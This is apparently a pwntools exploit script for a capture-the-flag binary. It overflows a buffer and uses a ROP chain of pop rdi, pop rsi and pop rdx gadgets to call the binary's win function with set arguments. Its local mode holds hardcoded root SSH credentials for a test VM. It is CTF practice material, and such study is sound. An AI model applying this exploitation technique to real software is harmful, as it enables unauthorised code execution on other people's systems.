from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn06"

exe = ELF("./chall",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    log.info("happy pwn!")
    rop = ROP(exe)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
    win = exe.sym.win
    log.success(f"win = {hex(win)}")
    log.success(f"ret = {hex(ret)}")
    log.success(f"pop_rdi = {hex(pop_rdi)}")
    log.success(f"pop_rsi = {hex(pop_rsi)}")
    log.success(f"pop_rdx = {hex(pop_rdx)}")
    pay = b"A" * 40
    pay += p64(ret)
    pay += p64(pop_rdi)
    pay += p64(0x1111222233334444)
    pay += p64(pop_rsi)
    pay += p64(0x5555666677778888)
    pay += p64(pop_rdx)
    pay += p64(0x9999AAAABBBBCCCC)
    pay += p64(win)
    log.success(f"payload = {pay}")
    sla(b"rop> ", pay)
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()